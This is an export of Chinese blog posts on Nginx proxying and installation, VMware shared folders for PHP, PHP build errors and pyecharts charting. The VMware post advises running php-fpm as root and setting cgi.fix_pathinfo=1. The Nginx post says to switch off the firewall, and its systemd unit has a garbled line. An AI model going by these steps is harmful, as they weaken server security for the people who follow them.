{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "深入理解Nginx工作原理", "log_Intro": "深入理解Nginx工作原理", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1>1 反向代理</h1>\n\n<h2>1.1 概念</h2>\n\n<p>反向代理（Reverse Proxy）方式是指以代理服务器来接受internet上的连接请求，然后将请求转发给内部网络上的服务器，并将从服务器上得到的结果返回给internet上请求连接的客户端，此时代理服务器对外就表现为一个服务器。</p>\n\n<p>举个例子，比如我想访问 <code>http://www.test.com/readme</code>，但<code>www.test.com</code>上并不存在readme页面，于是他是偷偷从另外一台服务器上取回来，然后作为自己的内容返回用户，但用户并不知情。这里所提到的 <code>www.test.com</code> 这个域名对应的服务器就设置了反向代理功能。</p>\n\n<p><strong>结论就是，反向代理服务器对于客户端而言它就像是原始服务器，并且客户端不需要进行任何特别的设置</strong>。客户端向反向代理的命名空间(name-space)中的内容发送普通请求，接着反向代理服务器将判断向何处(原始服务器)转交请求，并将获得的内容返回给客户端，就像这些内容原本就是它自己的一样。</p>\n\n<p><strong>正向代理，既然有反向代理，就肯定有正向代理。什么叫正向代理呢？</strong></p>\n\n<p>正向代理（Forward Proxy）通常都被简称为代理，就是在用户无法正常访问外部资源，比方说受到GFW的影响无法访问twitter的时候，我们可以通过代理的方式，让用户绕过防火墙，从而连接到目标网络或者服务。</p>\n\n<p><strong>正向代理的工作原理就像一个跳板</strong>，比如：我访问不了google.com，但是我能访问一个代理服务器A，A能访问google.com，于是我先连上代理服务器A，告诉他我需要google.com的内容，A就去取回来，然后返回给我。从网站的角度，只在代理服务器来取内容的时候有一次记录，有时候并不知道是用户的请求，也隐藏了用户的资料，这取决于代理告不告诉网站。</p>\n\n<p><strong>结论就是，正向代理是一个位于客户端和原始服务器(origin server)之间的服务器</strong>。为了从原始服务器取得内容，客户端向代理发送一个请求并指定目标(原始服务器)，</p>                                    </div>", "log_PostTime": 1584891018, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Linux虚拟机和Window本地共享文件夹用于PHP项目调试", "log_Intro": "Linux虚拟机和Window本地共享文件夹用于PHP项目调试", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h3><strong>我这里虚拟机Linux版本是centos7</strong></h3>\n\n<p><strong>第一步 安装vmware tools</strong></p>\n\n<pre class=\"has\">\n<code>1.VMware Workstation菜单栏中，选择“虚拟机”，”安装VMware Tools...“。\n\n2.挂载VMware Tools安装程序到/mnt/cdrom/。\n\nmkdir /mnt/cdrom\nmount /dev/cdrom /mnt/cdrom\n看到mount: /dev/sr0 is write-protected, mounting read-only，表示挂载成功。\n\n3.解压安装VMware Tools。\n\ncd /mnt/cdrom\nls -all\ntar -zxvf VMwareTools-10.1.6-5214329.tar.gz -C /tmp\n需要注意的是，这里不能解压到挂载目录下，因为是read-only，我们解压到/tmp下面。\n\n4.安装\n\ncd /tmp/vmware-tools-distrib/\n./vmware-install.pl\n安装过程中：\n注意有yes、no选项的就yse   没有的直接回车\n如果一直报错path ''类似的错误，就打no\n理论上一路按回车，安装就会成功。</code></pre>\n\n<p><strong>第二步 设置共享文件夹</strong></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20200129155433697.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20200129155446456.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<hr><p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20200129155510696.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3hpYW93ZWl0ZTE=,size_16,color_FFFFFF,t_70\"></p>\n\n<hr><p> </p>\n\n<p>接下来就好了，可以尝试在主机的共享文件夹中存放一个文件 ，查看VMware中Linux的/mnt/hgfs/ 中是否有该文件夹,假如hgfs里面没有共享的文件夹，则需要下面第三步</p>\n\n<p><strong>第三步 解决共享文件夹不显示</strong><br>\n使用以下办法解决(root权限)：</p>\n\n<ol><li>\n\t<p>vmware-hgfsclient 命令查看当前有哪些共享的目录，这里我只使用了shared文件夹</p>\n\t</li>\n\t<li>\n\t<p>使用 mount -t vmhgfs .host:/shared /mnt/hgfs 命令挂载该共享文件夹(注意：带.号的哦)，其中.host:/Documents是共享名，只需把Documents换成<br>\n\t使用vmware-hgfsclient 命令得到的目录，/mnt/hgfs是挂载点</p>\n\t</li>\n\t<li>到此为止是可以使用该共享文件夹了，但每次都得重复mount一次，所以需要设置为随机启动后自动挂载<br>\n\t编辑 /etc/fstab，添加下面一行<br>\n\t.host:/shared /mnt/hgfs vmhgfs defaults 0 0 （按需写）</li>\n</ol><p>补充：<br>\n如果显示<br>\nError: cannot mount filesystem: No such device<br>\nubuntu则先执行 sudo apt-get install open-vm-dkms<br>\n然后再执行3</p>\n\n<p>centos7则先执行 yum install open-vm-tools</p>\n\n<p>然后再执行vmhgfs-fuse .host:/shared /mnt/hgfs，现在应该可以看到hgfs里面的文件夹了，不过我还是做不到让它启动后自动挂载，每次启动需要重新执行这个命令。<br>\n**最后加载网站的时候可能会出现file not found之类的错误,</p>\n\n<p>打开文件： usr/local/php/etc/php.ini，修改以下配置<br>\n把cgi.fix_pathinfo=0 改为 cgi.fix_pathinfo=1<br>\n把 ;cgi.force_redirect=1 改为 cgi.force_redirect=0<br>\n修改php-fpm.conf里面的user和group都为root，<br>\n然后执行命令php-fpm -R 就ok**</p>\n                                    </div>", "log_PostTime": 1584891019, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "php-7.3.13 configure: error: Please reinstall the libzip distribution", "log_Intro": "php-7.3.13 configure: error: Please reinstall the libzip distribution", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p><img alt=\"\" class=\"has\" src=\"https://img-blog.csdnimg.cn/20200202102509413.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9sYW5zb25saS5ibG9nLmNzZG4ubmV0,size_16,color_FFFFFF,t_70\"></p>\n\n<pre class=\"has\">\n<code>wget https://libzip.org/download/libzip-1.5.2.tar.gz\n\ntar -zxf libzip-1.5.2.tar.gz\n\ncd libzip-1.5.2\n\nmkdir build\n\ncd build \n\ncmake ..\n\nmake -j4\n\nmake install</code></pre>\n\n<p>一般出现这个-bash: make: command not found提示，是因为安装系统的时候使用的是最小化mini安装，系统没有安装make、vim等常用命令，直接yum安装下即可。</p>\n\n<pre class=\"has\">\n<code>yum -y install gcc automake autoconf libtool make</code></pre>\n\n<h3>如果发现 cmake没有安装,可以下面方法进行安装</h3>\n\n<p>1、安装gcc等必备程序包（已安装则略过此步）</p>\n\n<p>yum install -y gcc gcc-c++ make automake <br>\n2、安装wget （已安装则略过此步）</p>\n\n<p>yum install -y wget<br>\n3、获取CMake源码包</p>\n\n<p>wget https://cmake.org/files/v3.12/cmake-3.12.0-rc1.tar.gz<br>\n4、解压CMake源码包</p>\n\n<p>tar -zxvf cmake-3.12.0-rc1.tar.gz<br>\n5、进入cmark的源码目录</p>\n\n<p>cd cmake-3.12.0-rc1<br>\n6、运行当前目录下的一个文件</p>\n\n<p>./bootstrap<br>\n7、运行命令（这步时间有点长）</p>\n\n<p>gmake<br>\n8、进行安装</p>\n\n<p>gmake install<br>\n9、安装完成，可阅读install_manifest.txt查看具体都安装了什么，还可以通过cmake --version 查看cmake版本号，如果输出版本号，则安装成功。<br>\n </p>\n                                    </div>", "log_PostTime": 1584891020, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "php7安装执行configure报错error: off_t undefined; check your library configuration", "log_Intro": "php7安装执行configure报错error: off_t undefined; check your library configuration", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <pre class=\"has\">\n<code>vim /etc/ld.so.conf \n#添加如下几行\n/usr/local/lib64\n/usr/local/lib\n/usr/lib\n/usr/lib64 \n#保存退出\n:wq\nldconfig -v # 使之生效</code></pre>\n                                    </div>", "log_PostTime": 1584891021, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Centos7上安装Nginx两种方法", "log_Intro": "Centos7上安装Nginx两种方法", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <h1>源码编译安装</h1>\n\n<p>http://nginx.org/en/download.html</p>\n\n<p>到官网下载，然后用XFTP上传到root目录</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwODAxL2ViOGY5YjRhNGVkMjQyZTNiOTc5ZDkwMjBlNGM1ZmRlLnBuZw?x-oss-process=image/format,png\"></p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwODAxL2QxMmZmYjE0YzdjMzRhYWM5MTA1ZWUxZDcxZjZlMzQwLnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>把文件解压出来</p>\n\n<p>tar -zxvf nginx-1.16.0.tar.gz</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwODAxLzA1N2I3MzdhNzE4NjQxY2I4OTY1Y2Q0ZTNhNDZmMzNmLnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>然后用yum安装依赖项</p>\n\n<p>yum install gcc pcre-devel zlib-devel</p>\n\n<p>如果没装以上相关的依赖，会在./configure过程中出现各种错误</p>\n\n<p>下图是没装gcc包的错误，我看网上要装gcc-c++，但我发现我只安装gcc也没问题</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwODAxL2NmZTdkNzU1NGNkNDRjYThiZjRlOWE1OThmZTE1YjE5LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>下图是没装pcre-devel出现的错误</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwODAxLzAxNzA3YTk0MTM3ZTQ4ZTBiOWIwMjIyNmNiMjE2ZWZjLnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>下图是没装zlib-devel出现的错误</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwODAxL2IxYTZjNTZlOGY2NTQzZjc5ZjljYzFjZWZiNmVkMDQ1LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>进入nginx-1.16.0目录后，输入命令./configure，这个命令会在目录里生成Makefile文件</p>\n\n<p>./configure</p>\n\n<p>成功后会提示如下图所示，在目录也会生成Makefile跟objs目录</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwODAxLzdjNzA2OWEyNDcwNzQ5YTliNTZmYmE3ZmU5ZGI2NDY0LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>再输入make命令生成二进制文件，屏幕会出现一堆命令，最后如下图所示</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwODAxLzNiOWVlMjA1N2Y2YzQ3MjI5MTQ0ZTBmNDhhMTc5M2U2LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>然后输入make install，把相关文件拷贝到对应的目录中，默认是/usr/local/nginx</p>\n\n<p>make</p>\n\n<p>make install</p>\n\n<p>你会发现这种安装方法非常的绿色，好像跟没安装一样，连服务都没有，那只能自己动手创建服务了</p>\n\n<p>cd /etc/systemd/system</p>\n\n<p>vi nginx.service</p>\n\n<p>将以下内容复制到nginx.service里保存退出，以下内容，我是从官方yum安装后的service里面复制修改的</p>\n\n<p>[UNIT]</p>\n\n<p>Deion=nginx - high performance web server</p>\n\n<p>Documentation=http://nginx.org/en/docs/</p>\n\n<p>After=network-online.target remote-fs.target nss-lookup.target</p>\n\n<p>Wants=network-online.target</p>\n\n<p>[Service]</p>\n\n<p>Type=forking</p>\n\n<p>PIDFile=/usr/local/nginx/logs/nginx.pid</p>\n\n<p>ExecStart=/usr/local/nginx/sbin/nginx -c /usr/local/nginx/conf/nginx.conf</p>\n\n<p>ExecReload=/bin/kill -s HUP $MAINPID</p>\n\n<p>ExecStop=/bin/kill -s TERM $MAINPID</p>\n\n<p>[Install]</p>\n\n<p>WantedBy=multi-user.target</p>\n\n<p>然后将nginx设置为开机启动</p>\n\n<p>systemctl enable nginx</p>\n\n<p>你会发现现在无法启动nginx，我也搞不懂为什么，不过我重启后就正常了。</p>\n\n<h1>通过Yum安装Nginx</h1>\n\n<p>这种方式是非常简单方便，nginx官网上也有介绍</p>\n\n<p>http://nginx.org/en/linux_packages.html#RHEL-CentOS</p>\n\n<p>官方说明就是在/etc/yum.repo.d目录下面创建一个nginx的yum源，然后就可以直接用yum install nginx安装了，超级简单，这种方式就直接帮你把服务、都安装好了</p>\n\n<p>cd /etc/yum.repo.d #切换到yum安装源文件目录</p>\n\n<p>vi nginx.repo #创建一个安装包源</p>\n\n<p>把以下内容复制进去，保存退出</p>\n\n<p>[nginx-stable]</p>\n\n<p>name=nginx stable repo</p>\n\n<p>baseurl=http://nginx.org/packages/centos/$releasever/$basearch/</p>\n\n<p>gpgcheck=1</p>\n\n<p>enabled=1</p>\n\n<p>gpgkey=https://nginx.org/keys/nginx_signing.key</p>\n\n<p>[nginx-mainline]</p>\n\n<p>name=nginx mainline repo</p>\n\n<p>baseurl=http://nginx.org/packages/mainline/centos/$releasever/$basearch/</p>\n\n<p>gpgcheck=1</p>\n\n<p>enabled=0</p>\n\n<p>gpgkey=https://nginx.org/keys/nginx_signing.key</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwODAxLzhkOTZiODI0MjA0ZjRhNjZiY2RkYjE5M2ZhMDE0MzY4LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>然后查看一下是否成功加载了这个安装源</p>\n\n<p>yum repolist</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwODAxLzEyMmQ2Mjc3OTQwNDRjNjFiYmI5Yjg4MGQyOTUzODNjLnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>现在就可以通过yum安装nginx了</p>\n\n<p>yum install nginx</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwODAxL2RlMzc2MjNhYjQxYjRjMzFhNDk1M2RmMzc3OTNjYzIyLnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>安装好后，直接用systemctl启动nginx服务</p>\n\n<p>systemctl enable nginx　　#设置nginx为开机启动</p>\n\n<p>systemctl start nginx　　#启动nginx服务</p>\n\n<p>刚装好，发现启动失败了</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwODAxL2E4MmYzMDkxNGVlYTRhZmY4MzEyNGY4M2YxNjgwMTM2LnBuZw?x-oss-process=image/format,png\"></p>\n\n<p>不过我重启下服务器，发现又能正常启动了。。然后记得把防火墙关了 systemctl stop firewalld，输入服务器ip，发现ok了</p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovLzViMDk4OGU1OTUyMjUuY2RuLnNvaHVjcy5jb20vaW1hZ2VzLzIwMTkwODAxL2M5ZjcwM2NhMWQyMTQ3YTZhN2Q3NTFkZjI3ZWQ4NzZmLnBuZw?x-oss-process=image/format,png\"></p>\n                                    </div>", "log_PostTime": 1584891021, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "Nginx: [emerg] getpwnam(“www”) failed错误", "log_Intro": "Nginx: [emerg] getpwnam(“www”) failed错误", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>Linux 64系统中安装nginx时如果出现错误：nginx: [emerg] getpwnam(“www”) failed in ........<br><strong>解决方法1：</strong><br>\n      在nginx.conf中 把user www www;的注释去掉,在这句前面加#即可 <br><strong>解决方法2：</strong><br>\n      错误的原因是没有创建www这个用户，应该在服务器系统中添加www用户组和用户www，如下命令：</p>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>/usr/sbin/groupadd -f www\n\n/usr/sbin/useradd -g www www</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891022, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "python可视化来分析全国疫情", "log_Intro": "python可视化来分析全国疫情", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>很长一段时间在python下出图都是使用matplotlib，其好处就是应用比较广泛，文档很容易找，不过出的图微显丑陋。<a href=\"https://github.com/pyecharts/pyecharts\">pyecharts</a> 是百度的echarts基于python的实现，可以很方便的直接在python里进行调用。其出的图相当漂亮。但由于版本原因，一些方法可能和老的版本会有不同。</p>\n\n<h3>一、安装</h3>\n\n<p>我这里使用的python版本是python3.7，使用pyecharts也是最新的。使用pip安装还是比较简单的。</p>\n\n<pre class=\"has\">\n<code>pip install pyecharts \npip install pyecharts-jupyter-installer</code></pre>\n\n<p>注意，第二个包是为了和jupyter进行集成用的，便于直接在页面上出图。第二个包不装或都调用的参数不对，都会出现如下的报错：</p>\n\n<pre class=\"has\">\n<code>Javascript error adding output!\nReferenceError: echarts is not defined\nSee your browser Javascript console for more details.</code></pre>\n\n<p>另外国内的地图和之前的版本不同，是进行了单独分离过的，如果需要使用，需要使用如下命令进行安装：</p>\n\n<pre class=\"has\">\n<code>pip install echarts-countries-pypkg\npip install echarts-china-provinces-pypkg\npip install echarts-china-cities-pypkg\npip install echarts-china-counties-pypkg\npip install echarts-china-misc-pypkg\npip install echarts-united-kingdom-pypkg</code></pre>\n\n<p>安装完成后，可以使用pip show pyecharts 查看安装的位置。</p>\n\n<h3>二、jupyter运行出图</h3>\n\n<p>我这里使用的jupyter直接在页面上调用使用的，测试代码如下：</p>\n\n<pre class=\"has\">\n<code>from pyecharts.charts import Bar\nfrom pyecharts import options as opts\nbar = (\nBar()\n.add_xaxis([\"衬衫\", \"毛衣\", \"领带\", \"裤子\", \"风衣\", \"高跟鞋\", \"袜子\"])\n.add_yaxis(\"商家A\", [114, 55, 27, 101, 125, 27, 105])\n.add_yaxis(\"商家B\", [57, 134, 137, 129, 145, 60, 49])\n.set_global_opts(title_opts=opts.TitleOpts(title=\"某商场销售情况\"))\n)\nbar.render_notebook()\n#bar.render() #使用render方法会生成html页面</code></pre>\n\n<p>直接页面上运行后结果如下：</p>\n\n<p><a href=\"http://www.361way.com/wp-content/uploads/2019/08/pyecharts.gif\" rel=\"nofollow\"><img alt=\"pyecharts\" class=\"has\" height=\"576\" src=\"https://imgconvert.csdnimg.cn/aHR0cDovL3d3dy4zNjF3YXkuY29tL3dwLWNvbnRlbnQvdXBsb2Fkcy8yMDE5LzA4L3B5ZWNoYXJ0cy5naWY\" width=\"1022\"></a></p>\n\n<p>另外如果在jupyter页面上不能出图，除了上面提到的类名称引入不对外，还可能是缺少html5lib包。还需要注意jupter和jupterlab是两个不同的产品，后面这个是jupter的未来版。这个在引入的时候使用的代码是有区别的。具体可以看官方示例。</p>\n\n<h3>python可视化来分析全国疫情代码</h3>\n\n<pre class=\"has\">\n<code>from pyecharts import options as opts\nfrom pyecharts.charts import Geo\nfrom pyecharts.globals import ChartType, SymbolType\nimport requests\nimport json\nres = json.loads(requests.get('http://www.dzyong.top:3005/yiqing/province/').text)\nprint(res)\nprovince = [p['provinceName'] for p in res['data']]\nval1 = [p['confirmedNum'] for p in res['data']]\nval2 = [p['curesNum'] for p in res['data']]\nval3 = [p['deathsNum'] for p in res['data']]\ngeo = Geo()\ngeo.add_schema(maptype=\"china\")\ngeo.add(\n    \"geo\",\n    [list(z) for z in zip(province, val1)],\n    type_=ChartType.EFFECT_SCATTER,\n)\n\ngeo.set_series_opts(label_opts=opts.LabelOpts(is_show=False, background_color='black', color='green'))\ngeo.set_global_opts(\n    visualmap_opts=opts.VisualMapOpts(is_piecewise=True, min_=0, max_=30000),\n    title_opts=opts.TitleOpts(title=\"全国实时数据\"))\ngeo.render('全国实时数据.html')</code></pre>\n\n<p> </p>\n                                    </div>", "log_PostTime": 1584891024, "log_Meta": ""}
{"log_CateID": 2, "log_AuthorID": 1, "log_Title": "pyEcharts安装及详细使用指南", "log_Intro": "pyEcharts安装及详细使用指南", "log_Content": "<div class=\"htmledit_views\" id=\"content_views\">\n                                            <p>ECharts是一个纯Javascript的图表库，可以流畅的运行在PC和移动设备上，兼容当前绝大部分浏览器，底层依赖轻量级的Canvas类库ZRender，提供直观、生动、可交互、可高度个性化定制的数据可视化图表。ECharts提供了常规的折线图、柱状图、散点图、饼图、K线图，用于统计的盒形图，用于地理数据可视化的地图、热力图、线图，用于关系数据可视化的关系图、treemap，多维数据可视化的平行坐标，还有用于BI的漏斗图、仪表盘，并且支持图与图之间的混搭。</p>\n\n<p>pyEcharts目前有0.5及以下版本和1.0以上版本，新版的pyecharts发生了许多变化。最为明显的是以前调整变量的命令现在都发生了改变。width是旧版本中对图表调整的参数，在新版本这一功能被调整到了option里面。网上大部分教程都是0.5及以下版本。</p>\n\n<pre class=\"has\">\n<code>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple pyecharts==0.5.10</code></pre>\n\n<p> </p>\n\n<p>自从 v0.3.2 开始，为了缩减项目本身的体积以及维持 pyecharts 项目的轻量化运行，pyecharts 将不再自带地图 js 文件。如用户需要用到地图图表，可自行安装对应的地图文件包。下面介绍如何安装。</p>\n\n<ul><li>全球国家地图: echarts-countries-pypkg (1.9MB): 世界地图和 213 个国家，包括中国地图</li>\n\t<li>中国省级地图: echarts-china-provinces-pypkg (730KB)：23 个省，5 个自治区</li>\n\t<li>中国市级地图: echarts-china-cities-pypkg (3.8MB)：370 个中国城市</li>\n\t<li>中国县区级地图: echarts-china-counties-pypkg (4.1MB)：2882 个中国县·区</li>\n\t<li>中国区域地图: echarts-china-misc-pypkg (148KB)：11 个中国区域地图，比如华南、华北。</li>\n</ul><p>选择自己需要的安装</p>\n\n<pre class=\"has\">\n<code>pip install -i https://pypi.tuna.tsinghua.edu.cn/simple echarts-countries-pypkg\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple echarts-china-provinces-pypkg\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple echarts-china-cities-pypkg\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple echarts-china-counties-pypkg\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple echarts-china-misc-pypkg\npip install -i https://pypi.tuna.tsinghua.edu.cn/simple echarts-united-kingdom-pypkg // 如果提示缺少这个就安装一下\npip  install pyecharts_snapshot</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<p><strong>教育网用户在install 增加 </strong><strong>–i https:</strong><strong>//pypi.tuna.tsinghua.edu.cn/simple</strong></p>\n\n<p><strong>注意：</strong><br>\n1.如果不知道安装那个，就全部安装，反正不会错，安装版本一定是要在0.5及以下。<br>\n2.如果你安装的是1.0及以上版本，请自行阅读官方文档。<a href=\"https://www.cnblogs.com/dgwblog/p/11811562.html#/zh-cn/intro\" rel=\"nofollow\">https://pyecharts.org/#/zh-cn/intro</a><br>\n3.安装完一定要<strong>重启</strong>pycharm！！！</p>\n\n<h2 id=\"autoid-0-0-0\"><strong>1.柱状图</strong></h2>\n\n<p>代码如下：</p>\n\n<pre class=\"has\">\n<code># -*- coding:utf-8 -*-\n\nfrom pyecharts import Bar\n\nbar = Bar(\"贵州GDP柱状图\", \"副标题\")\n\nbar.add(\"GDP\",[\"贵阳市\", \"遵义市\", \"六盘水市\", \"安顺市\", \"黔东南州\"],[40, 30, 26, 22, 15])\n\nbar.show_config()\n\nbar.render()</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<p>代码运行之后，会在本地生成一个render.html文件，打开输出如下所示图形。</p>\n\n<p> </p>\n\n<pre class=\"has\">\n<code>from pyecharts import Bar\n\n#从pyecharts库中导入Bar子类\n\nbar = Bar(\"贵州GDP柱状图\", \"副标题\")\n\n#定义Bar()柱状图，同时设置主标题和副标题\n\nbar.add()\n\n#调用add()函数添加图表的数据和设置各种配置项\n\nbar.show_config()\n\n#打印输出图表的所有配置项\n\nbar.render()\n\n#生成render.html文件，也可以设置路径和文件名</code></pre>\n\n<p> </p>\n\n<p><img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2ktYmV0YS8xMTYwNDg0LzIwMTkxMS8xMTYwNDg0LTIwMTkxMTA3MTM0MDU5Njg3LTE3MjEyMjA3ODkucG5n?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<h3 id=\"autoid-1-0-0\"><strong>2.横向柱状图</strong></h3>\n\n<p>代码如下：</p>\n\n<pre class=\"has\">\n<code># -*- coding:utf-8 -*-\n\nfrom pyecharts import Bar\n\nbar = Bar(\"贵州GDP柱状图\", \"副标题\")\n\ncity = [\"贵阳市\", \"遵义市\", \"六盘水市\", \"安顺市\", \"黔东南州\"]\n\ndata1 = [40, 30, 26, 22, 15]\n\ndata2 = [13, 43, 32, 38, 20]\n\nbar.add(\"2017年GDP\", city, data1)\n\nbar.add(\"2016年GDP\", city, data2, is_convert=True)\n\nbar.show_config()\n\nbar.render()</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<p>输出如下图所示：</p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2ktYmV0YS8xMTYwNDg0LzIwMTkxMS8xMTYwNDg0LTIwMTkxMTA3MTM0MDUxMDIwLTE3MDc1MjA2MzUucG5n?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<h3 id=\"autoid-1-1-0\"><strong>3.带有涟漪特效动画的散点图</strong></h3>\n\n<p>这段代码参考简书网 <a href=\"https://www.jianshu.com/p/b718c307a61c\" rel=\"nofollow\">https://www.jianshu.com/p/b718c307a61c</a> ，强烈推荐大家学习chenjiandongx大神的文章。完整代码如下：</p>\n\n<p> </p>\n\n<pre class=\"has\">\n<code># -*- coding:utf-8 -*-\n\nfrom pyecharts import EffectScatter\n\nes = EffectScatter(\"动态散点图各种图形示例\")\n\nes.add(\"\", [10], [10], symbol_size=20, effect_scale=3.5, effect_period=3, symbol=\"pin\")\n\nes.add(\"\", [20], [20], symbol_size=12, effect_scale=4.5, effect_period=4, symbol=\"rect\")\n\nes.add(\"\", [30], [30], symbol_size=30, effect_scale=5.5, effect_period=5, symbol=\"roundRect\")\n\nes.add(\"\", [40], [40], symbol_size=10, effect_scale=6.5, effect_brushtype='fill', symbol=\"diamond\")\n\nes.add(\"\", [50], [50], symbol_size=16, effect_scale=5.5, effect_period=3, symbol=\"arrow\")\n\nes.add(\"\", [60], [60], symbol_size=6, effect_scale=2.5, effect_period=3, symbol=\"triangle\")\n\nes.render() </code></pre>\n\n<p> </p>\n\n<p>运行结果如下图所示：</p>\n\n<p> <img alt=\"\" class=\"has\" src=\"https://imgconvert.csdnimg.cn/aHR0cHM6Ly9pbWcyMDE4LmNuYmxvZ3MuY29tL2ktYmV0YS8xMTYwNDg0LzIwMTkxMS8xMTYwNDg0LTIwMTkxMTA3MTM0MTIwNTU3LTEwOTQzMDQ0ODAucG5n?x-oss-process=image/format,png\"></p>\n\n<p> </p>\n\n<h3 id=\"autoid-1-2-0\"><strong>4.绘制3D图形</strong></h3>\n\n<p>绘制3D折线图代码如下：</p>\n\n<pre class=\"has\">\n<code># -*- coding:utf-8 -*-\n\nfrom pyecharts import Line3D\n\nimport random\n\ndata = [[1,2,3,4], [1,2,3,4], [0,4,8,16]]\n\nLine3D = Line3D(\"3D 折线图示例\", width=1200, height=600)\n\nLine3D.add(\"\", data, is_visualmap=True)\n\nLine3D.render()</code></pre>\n\n<p> </p>\n\n<p> </p>\n\n<p>输出图形如下所示：</p>\n\n<p> <img alt=\"\" class=\"has\" 